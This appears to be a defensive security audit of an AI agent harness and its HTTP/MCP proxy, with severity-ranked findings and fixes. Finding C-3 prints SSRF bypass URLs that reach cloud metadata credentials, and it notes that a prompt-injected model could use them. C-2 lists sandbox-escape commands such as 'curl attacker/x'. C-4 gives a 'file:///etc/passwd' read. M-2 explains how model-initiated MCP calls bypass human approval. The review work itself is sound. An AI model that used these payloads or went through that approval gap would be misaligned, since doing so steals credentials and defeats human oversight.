# clm-mem — Security Audit & Bug Report

**Scope:** the `shatterling` package (memory harness + `purslane` HTTP/MCP proxy,
agent tools, sandbox) as of `main` (commit `26f9b14`).
**Method:** manual review of every network-facing and execution path; targeted
verification of path-resolution and SSRF logic in an isolated harness.
**Date:** 2026-11-09

> This is a *review* report, not a patch. Each finding lists severity,
> the affected code, why it matters, and a concrete remediation. Findings are
> ordered by severity within each repository section.

---

## 1. Executive summary

clm-mem ships a **networked HTTP + MCP server** (`purslane`) whose default
posture is *loopback-only with authentication disabled*. That is the correct
default for a local tool, and the codebase already warns loudly when you bind
non-loopback without a key. The genuinely dangerous surface is what sits
*behind* that gate:

1. **The `purslane` proxy is a full RCE primitive** (arbitrary shell execution,
   file write/read/delete, and web fetch) reachable over HTTP. The only thing
   standing between the network and the host is the optional Bearer key.
2. **The `jail` sandbox is not a security boundary.** It is honestly documented
   as such, but it has no network isolation and its rlimits are bypassable by a
   determined script — so "exec" effectively means *run arbitrary code as the
   server user with full host network + filesystem reach*.
3. **The web-fetch tool's SSRF guard is bypassable** (IPv4-in-IPv6, integer and
   percent-encoded hosts), so it can read cloud/VM metadata credentials even on
   loopback.
4. **`web_fetch` accepts any URL scheme** (`file://`, `gopher://`, …) because the
   only guard is a three-entry hostname blocklist — a local-file-read primitive.
5. Several lower-severity bugs: CORS + credentials combination, MCP bypasses the
   approval policy for model-initiated calls, session/workspace IDs are not
   validated on some routes, and the `run_python` tool writes to a shared scratch
   path (cross-session overwrite).

The good news: **no** use of `pickle`, `yaml.load`, `eval`/`exec`, or raw SQL;
JSON-only deserialization; constant-time key comparison; static-asset paths are
basename-pinned; and the sandbox *file* API's path resolution is solid (verified
— see §2.1). The issues below are about the *execution* and *network* surfaces,
not classic injection.

---

## 2. Findings

### CRITICAL / HIGH

#### C-1 — `purslane` server: unauthenticated RCE when exposed (design-level)
**Where:** `shatterling/purslane/server.py` (`do_POST` → `_clm_tools_post` →
`sandbox/exec`, `sandbox/write`, `toolcall`, `search`); auth in `_auth_check`.

The proxy exposes, over plain HTTP:
- `POST /v1/clm/sessions/<sid>/sandbox/exec` — runs an arbitrary `/bin/sh -c <command>`;
- `.../sandbox/write` and `.../delete` — write/delete files under the workspace;
- `.../toolcall` with tool `run_command` / `run_python` — same, via the tool manager;
- `.../search` / `web_fetch` — outbound HTTP.

Authentication is **off by default** (`SecurityConfig.api_key = ""`). The CLI
defaults to `--host 127.0.0.1`, so out-of-the-box this is loopback-only and the
risk is bounded. But the moment an operator binds `--host 0.0.0.0` (or runs behind
a tunnel/port-forward) *without* setting `CLM_MEM_API_KEY`, **anyone on the
network gets arbitrary command execution as the server user.**

The startup banner does warn about this, which is good — but a warning is not a
control. There is no TLS, no rate limiting, and no per-route capability model.

**Impact:** full host compromise from any network peer (or any local process that
can reach the port) when auth is off or the key leaks.
**Remediation:
- Make `--api-key` **required** whenever `--host` is non-loopback (refuse to start
  otherwise), rather than only warning.
- Serve over TLS (or document that a reverse proxy with TLS + mTLS is mandatory).
- Consider splitting the *memory* API and the *exec/file/web* API so a memory-only
  client can be granted no execution capability at all.

#### C-2 — `jail` sandbox provides no real isolation (documented, but under-stated in UI)
**Where:** `shatterling/tools/sandbox.py` (`_exec_jail`).

The default `sandbox_mode=jail` runs the command with:
- `cwd` pinned to the sandbox dir,
- a scrubbed environment (`ENV_KEEP`),
- rlimits: CPU, address space, file size, process count.

What it does **not** do: no network namespace, no filesystem/mount isolation, no
user drop, no seccomp. A command like `cat /etc/passwd`, `curl attacker/x`,
`python -c 'import socket...'`, or writing to any world-writable path succeeds.
The rlimits are also trivially bypassable (a script can `setrlimit` its own child
higher within the hard limit, or fork around `RLIMIT_NPROC`).

The module docstring is *honest* about this ("NOT a security boundary against a
hostile script"). The risk is that the **web studio and MCP describe this as
"sandboxed"**, which can mislead an operator into believing exec is contained.
**Impact:** "run in sandbox" ≈ "run as the server user with full host reach."
**Remediation:
- Default to `docker` (real `--network none` + resource limits) when a docker CLI
  is present, and make the isolation level *prominent* in every UI/MCP response
  that reports an exec result (the `isolation` field exists — surface it loudly).
- For `jail`, additionally drop to an unprivileged user and add a seccomp/landlock
  profile so at least filesystem + syscall reach is bounded.

#### C-3 — SSRF guard in the web tool is bypassable (metadata credential theft)
**Where:** `shatterling/tools/web.py` (`_get`, `BLOCKED_HOSTS`).

The only outbound-fetch guard is a **three-host blocklist** matched against
`urlparse(url).hostname`. Verified bypasses:

| Input | `hostname` | blocked? |
|---|---|---|
| `http://169.254.169.254/...` | `169.254.169.254` | yes |
| `http://[::ffff:169.254.169.254]/...` | `::ffff:169.254.169.254` | **no** |
| `http://2130706433/...` (decimal for 169.254.169.254) | `2130706433` | **no** |
| `http://169.254.169.254%2f/...` | `169.254.169.254%2f` | **no** |

So on a cloud VM / container, an agent (or a prompt-injected model) can fetch
`http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/...`
and exfiltrate instance credentials. This works **even on loopback** — it does not
depend on the server being exposed.

A hostname blocklist is the wrong tool here. The right control is to resolve the
address and reject private/link-local ranges *before* connecting, plus follow
redirects under the same check.
**Impact:** cloud/VM credential theft; internal network reconnaissance.
**Remediation:
- Resolve the target IP (`socket.getaddrinfo`) and refuse if it is link-local,
  loopback, or RFC1918 (unless an explicit allowlist is configured).
- Re-check after every redirect hop. Block non-`http(s)` schemes (see C-4).

#### C-4 — `web_fetch` accepts arbitrary URL schemes → local file read
**Where:** `shatterling/tools/web.py` (`fetch_page`, `_get`).

`fetch_page` only prepends `https://` when `"//" not in url`; otherwise it hands
the URL straight to `urllib.request.urlopen`. That means `file:///etc/passwd`,
`gopher://...`, and other schemes are *not* blocked by the hostname blocklist at
all (it checks `.hostname`, which is empty for `file://`). Combined with C-1/C-2,
this is a clean **arbitrary local-file read** primitive reachable from the agent.
**Impact:** read any file readable by the server user (`/etc/passwd`, SSH keys,
`.env`), independent of sandbox mode.
**Remediation:** allow only `http://` and `https://`; reject every other scheme
explicitly before opening the request.

---

### MEDIUM

#### M-1 — CORS echoes origin *and* sends `Access-Control-Allow-Credentials: true`
**Where:** `shatterling/purslane/security.py` (`cors_allowed_origin`,
`cors_allow_credentials`); `server.py` `_cors`.

When a specific origin is configured, the server both **echoes that origin** and
sends `Access-Control-Allow-Credentials: true`. That combination means a browser
on *any* configured origin can make **credentialed cross-origin requests**. If an
operator lists a broad or user-controllable origin, this becomes a CSRF/credential
leak vector against the (Bearer-protected) API. There is no check that credentials
are actually needed.
**Remediation:** drop `Access-Control-Allow-Credentials` unless genuinely required;
never combine it with wildcard; treat origin allowlist as exact-match only (it is,
but document that subdomains are not implicitly included).

#### M-2 — MCP `clm_tool_call` / `clm_sandbox_exec` bypass the approval policy for model-initiated calls
**Where:** `shatterling/purslane/mcp.py` (`_agent_result`) → `server.py`
`_clm_tools_post` (the `toolcall` branch sets `origin="user"`).

In `ToolManager.execute`, only calls whose `origin != "user"` go through the
approval broker. The MCP path labels every call `origin="user"` (and
`sandbox/exec` is *explicitly* documented as "human-initiated, so it bypasses
approval prompts"). So an **MCP client driven by a model** can run `run_command` /
`run_python` / file writes with **no approval gate**, even when the session's
`approval_mode=ask`. The human-approval control — one of the main safety features
for an agent that can exec — is silently disabled for the MCP surface.
**Remediation:** carry the *true* origin through MCP (distinguish "human clicked"
from "model called a tool") and route model-initiated MCP calls through the broker;
or gate `clm_sandbox_exec` behind the same policy as `run_command`.

#### M-3 — Session/workspace identifiers are not validated on several routes
**Where:** `server.py` (`do_DELETE`, `_clm_get`, `_clm_post`).

Workspace *creation* validates names against `WS_NAME_RE` and re-checks path
containment in `ws_dir` (good). But the **delete** route does
`name = path[len("/v1/clm/workspaces/"):].rstrip("/")` and calls
delete_workspace → `ws_dir(name)`, which *does* validate — OK. However, the
generic session routes (`_clm_get`/`_clm_post`) take `sid = parts[3]` with no
shape validation and pass it to `harness_for`; for non-`ws:` sids the workdir is
inherited from config, which is fine, but a crafted sid containing path separators
is only partially normalized (the `if "/" in parts[3]` re-split). The net effect is
low-risk today because file access still goes through the sandbox `_resolve`, but
it is an inconsistency worth tightening: validate `sid` against one canonical
pattern at the router edge and reject everything else with 400.
**Remediation:** centralize session-id validation (one regex) applied in every
handler that accepts a `sid`; return 400 on mismatch.

#### M-4 — `run_python` writes to a fixed shared scratch path (cross-session overwrite)
**Where:** `shatterling/tools/manager.py` (`_h_run_python`).

The script is written to `scratch/snippet_<seq>.py` **inside the session sandbox**.
That is per-session, so it is *not* a cross-project leak — but within one sandbox,
a model that can call both `run_python` and `read_file`/`write_file` can plant a
script at a predictable name and later exec/read it. More importantly the sequence
counter is per-`ToolManager`, so two concurrent python calls in the same session
can race on naming (mitigated by the lock, but the file persists across turns).
**Remediation:** use a unique temp name (`secrets.token_hex(8)`) and clean up after
execution; or run via `python3 -c` / stdin to avoid leaving files behind.

#### M-5 — `/health` and static assets are auth-exempt (information disclosure)
**Where:** `security.py` (`AUTH_EXEMPT_PATHS`, `STATIC_PATHS`); `server.py`
`do_GET`.

`/health` is exempt from auth and returns **all session ids**, backend host:port,
and the workspace root path. On a non-loopback bind with auth *on*, an unauthed
peer can enumerate live sessions and the filesystem layout. This is a minor leak
but it feeds other attacks (targeted session manipulation once you have the key).
**Remediation:** when auth is enabled, either require auth for `/health` or strip
session ids / absolute paths from the response.

---

### LOW / BUGS

#### L-1 — `read_body_bytes` trusts `Content-Length` without a cap (memory DoS)
**Where:** `server.py` (`read_body_bytes`).

`int(self.headers.get("Content-Length") or 0)` then `rfile.read(length)` with no
upper bound. A client can announce a huge body and exhaust memory/CPU while the
server reads. Add a max request-body size (e.g. a few MB) and reject larger ones.

#### L-2 — `_forward` relays an attacker-supplied `Authorization` header upstream
**Where:** `server.py` (`_auth_header`).

When no backend key is configured, the proxy **relays whatever Authorization header
the client sent** to the backend. If a client can reach both the proxy and (or is
the) the backend, this can be used to smuggle credentials or probe. Low risk when
the backend is loopback-only, but it means the proxy does not sanitize auth on the
outbound hop. Consider never relaying inbound auth upstream unless explicitly enabled.

#### L-3 — `Sandbox.delete` / `reset` use `shutil.rmtree` on user-supplied paths
**Where:** `sandbox.py` (`delete`, `reset`).

Both are guarded by `_resolve` (verified to reject traversal) and `delete` refuses
to remove the root itself, so this is **not** exploitable today. Flagging only
because `rmtree` on a path derived from input is a classic hazard — keep the
containment check in lockstep with any future change to `_resolve`.

#### L-4 — Docker fallback can silently downgrade isolation
**Where:** `sandbox.py` (`exec`).

If `mode=docker` but docker fails mid-run, it falls back to the weaker process jail
and only notes it in `ExecResult.note`. Ensure that note is surfaced (ties into C-2)
so a user never believes they got container isolation when they did not.

#### L-5 — No rate limiting / no request-size or concurrency cap on the proxy
**Where:** `server.py` (ThreadingHTTPServer, `daemon_threads=True`).

Unbounded threads + unbounded body reads (L-1) = easy resource-exhaustion DoS from a
single client. Add per-client throttling and a thread/connection cap.

---

## 3. What is done well (do not regress)

- **No unsafe deserialization** anywhere in the package: JSON only; no `pickle`,
  `yaml.load`, `eval`/`exec`, or dynamic import of user input.
- **Sandbox file-API path resolution is correct.** Verified: `/etc/passwd`,
  `../secret`, `foo/../../etc`, `/`, `//` are all rejected; only in-root paths pass.
- **Constant-time** API-key comparison (`hmac.compare_digest`).
- **Static assets** are served by `os.path.basename` from a fixed directory — no
  traversal.
- **Secure-by-default CORS** (same-origin only) and **loopback-only bind default**,
  with explicit startup warnings for the dangerous combinations.
- The sandbox docstring is *honest* that the jail is not a security boundary —
  keep that honesty visible in the UI/MCP output too.

---

## 4. Prioritized remediation checklist

1. **Require `--api-key` for any non-loopback bind** (turn the warning into an error). *(C-1)*
2. **Restrict `web_fetch` to http/https and add a real SSRF guard** (resolve +
   range-check, re-check on redirects). *(C-3, C-4)*
3. **Default exec to docker when available; surface the actual isolation level
   loudly in every result.** *(C-2, L-4)*
4. **Route model-initiated MCP calls through the approval broker** (carry true origin). *(M-2)*
5. **Drop `Access-Control-Allow-Credentials` unless required; keep exact-match origins.** *(M-1)*
6. **Cap request body size and add per-client rate limiting / thread cap.** *(L-1, L-5)*
7. **Validate session ids at the router edge with one canonical pattern.** *(M-3)*
8. **Use unique temp names + cleanup in `run_python`.** *(M-4)*
9. **Reduce `/health` disclosure when auth is on.** *(M-5)*
10. **Stop relaying inbound Authorization upstream by default.** *(L-2)*

---

*Generated as part of a paired security review of `clm-mem` and `tokamak`. The
companion report for the Django application lives in `../tokamak/SECURITY_AUDIT.md`.*
